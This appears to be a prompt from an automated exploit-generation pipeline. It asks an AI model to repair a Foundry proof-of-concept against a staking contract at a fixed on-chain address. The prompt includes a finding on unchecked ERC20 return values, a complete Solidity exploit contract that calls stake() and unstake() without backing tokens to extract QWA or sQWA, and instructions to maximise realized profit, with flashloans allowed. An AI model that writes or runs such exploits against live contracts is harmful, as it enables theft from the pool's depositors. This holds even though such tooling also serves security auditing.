You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unchecked ERC20 return values can mint unbacked stake receipts or release QWA without burning sQWA
- claim: `stake()` and `unstake()` call `transfer`/`transferFrom` on `QWA` and `sQWA` but never check the returned boolean. With any token implementation that signals failure by returning `false` instead of reverting, execution continues as if the transfer succeeded.
- impact: A failed `QWA.transferFrom` during `stake()` can still hand out sQWA without the pool receiving backing assets. A failed `sQWA.transferFrom` during `unstake()` can still release QWA without actually collecting sQWA. Conversely, a failed outgoing transfer can confiscate user assets by taking one side of the exchange without delivering the other.
- exploit_paths: ["Call `stake()` when `QWA.transferFrom(msg.sender, address(this), amount)` returns `false`; the function still executes `sQWA.transfer(to, amount)` and creates an unbacked claim.", "Call `unstake()` when `sQWA.transferFrom(msg.sender, address(this), amount)` returns `false`; the function can still pass the balance check and execute `QWA.transfer(to, amount)`.", "Call `unstake()` or `stake()` when the outgoing token transfer returns `false`; the function finishes without delivering the expected asset, leaving the user or pool shorted."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IStakingLike {
    function QWA() external view returns (address);

    function sQWA() external view returns (address);

    function stake(address to, uint256 amount) external;

    function unstake(address to, uint256 amount, bool rebase_) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x69422c7F237D70FCd55C218568a67d00dc4ea068;

    uint256 private constant PATH_STAKE_FALSE_RETURN = 1 << 0;
    uint256 private constant PATH_UNSTAKE_FALSE_RETURN = 1 << 1;
    uint256 private constant PATH_STAKE_OUTGOING_FALSE = 1 << 2;
    uint256 private constant PATH_UNSTAKE_OUTGOING_FALSE = 1 << 3;

    uint256 private constant FAIL_NO_SQWA_LIQUIDITY = 1 << 0;
    uint256 private constant FAIL_STAKE_DID_NOT_MINT = 1 << 1;
    uint256 private constant FAIL_NO_QWA_LIQUIDITY = 1 << 2;
    uint256 private constant FAIL_UNSTAKE_DID_NOT_PAY = 1 << 3;
    uint256 private constant FAIL_STAKE_OUTGOING_NOT_OBSERVED = 1 << 4;
    uint256 private constant FAIL_UNSTAKE_OUTGOING_NOT_OBSERVED = 1 << 5;

    address private _profitToken;
    uint256 private _profitAmount;
    uint256 public pathFlags;
    uint256 public failureFlags;
    bool public hypothesisValidated;
    bool public executed;

    constructor() {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IStakingLike staking = IStakingLike(TARGET);
        address qwa = staking.QWA();
        address sqwa = staking.sQWA();

        uint256 initialQwa = IERC20Like(qwa).balanceOf(address(this));
        uint256 initialSqwa = IERC20Like(sqwa).balanceOf(address(this));

        uint256 qwaPoolBalance = IERC20Like(qwa).balanceOf(TARGET);
        uint256 sqwaPoolBalance = IERC20Like(sqwa).balanceOf(TARGET);

        uint256 qwaAfter = initialQwa;
        uint256 sqwaAfter = initialSqwa;

        if (sqwaPoolBalance == 0) {
            // Path 1 needs the pool to already hold transferable sQWA. Without that liquidity,
            // an unbacked receipt cannot become realized attacker profit at this fork state.
            failureFlags |= FAIL_NO_SQWA_LIQUIDITY;
        } else {
            // Path 1 from the hypothesis:
            // 1. call stake() with no verifier QWA balance or approval
            // 2. if QWA.transferFrom only returns false, execution continues
            // 3. observe whether sQWA is still transferred out to the verifier
            (bool okStake, ) = TARGET.call(
                abi.encodeWithSelector(IStakingLike.stake.selector, address(this), 1)
            );
            uint256 qwaAfterStake = IERC20Like(qwa).balanceOf(address(this));
            uint256 sqwaAfterStake = IERC20Like(sqwa).balanceOf(address(this));
            qwaAfter = qwaAfterStake;
            sqwaAfter = sqwaAfterStake;

            if (
                okStake &&
                sqwaAfterStake > initialSqwa &&
                qwaAfterStake == initialQwa
            ) {
                pathFlags |= PATH_STAKE_FALSE_RETURN;
                hypothesisValidated = true;
            } else {
                // Concrete infeasibility at the fork:
                // - revert => the real token path did not permit silent false-return continuation
                // - success with no balance gain => no unbacked sQWA was minted to the attacker
                failureFlags |= FAIL_STAKE_DID_NOT_MINT;

                // A successful zero-delta stake would be consistent with the "outgoing transfer
                // returns false" harm case, but it does not create attacker profit.
                if (
                    okStake &&
                    sqwaAfterStake == initialSqwa &&
                    qwaAfterStake <= initialQwa
                ) {
                    pathFlags |= PATH_STAKE_OUTGOING_FALSE;
                } else {
                    failureFlags |= FAIL_STAKE_OUTGOING_NOT_OBSERVED;
                }
            }
        }

        if (qwaPoolBalance == 0) {
            // Path 2 needs the pool to already hold redeemable QWA. Without pool QWA, even a
            // silent sQWA.transferFrom failure cannot be monetized by the attacker.
            failureFlags |= FAIL_NO_QWA_LIQUIDITY;
        } else {
            // Path 2 from the hypothesis:
            // 1. call unstake() with no verifier sQWA balance or approval
            // 2. if sQWA.transferFrom only returns false, execution continues
            // 3. require() sees existing pool QWA
            // 4. observe whether QWA is still transferred out to the verifier
            uint256 preUnstakeQwa = IERC20Like(qwa).balanceOf(address(this));
            uint256 preUnstakeSqwa = IERC20Like(sqwa).balanceOf(address(this));

            (bool okUnstake, ) = TARGET.call(
                abi.encodeWithSelector(IStakingLike.unstake.selector, address(this), 1, false)
            );
            uint256 qwaAfterUnstake = IERC20Like(qwa).balanceOf(address(this));
            uint256 sqwaAfterUnstake = IERC20Like(sqwa).balanceOf(address(this));
            qwaAfter = qwaAfterUnstake;
            sqwaAfter = sqwaAfterUnstake;

            if (
                okUnstake &&
                qwaAfterUnstake > preUnstakeQwa &&
                sqwaAfterUnstake == preUnstakeSqwa
            ) {
                pathFlags |= PATH_UNSTAKE_FALSE_RETURN;
                hypothesisValidated = true;
            } else {
                // Concrete infeasibility at the fork:
                // - revert => the real token path did not permit silent false-return continuation
                // - success with no balance gain => no free QWA left the pool
                failureFlags |= FAIL_UNSTAKE_DID_NOT_PAY;

                // A successful zero-delta unstake would be consistent with the "outgoing transfer
                // returns false" harm case, but it is not a profitable attacker path.
                if (
                    okUnstake &&
                    qwaAfterUnstake == preUnstakeQwa &&
                    sqwaAfterUnstake <= preUnstakeSqwa
                ) {
                    pathFlags |= PATH_UNSTAKE_OUTGOING_FALSE;
                } else {
                    failureFlags |= FAIL_UNSTAKE_OUTGOING_NOT_OBSERVED;
                }
            }
        }

        uint256 qwaProfit = qwaAfter > initialQwa ? qwaAfter - initialQwa : 0;
        uint256 sqwaProfit = sqwaAfter > initialSqwa ? sqwaAfter - initialSqwa : 0;

        if (qwaProfit > 0) {
            _profitToken = qwa;
            _profitAmount = qwaProfit;
        } else if (sqwaProfit > 0) {
            _profitToken = sqwa;
            _profitAmount = sqwaProfit;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: qwa.transferfrom(msg.sender, address(this), amount), sqwa.transfer(to, amount), sqwa.transferfrom(msg.sender, address(this), amount), qwa.transfer(to, amount)
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
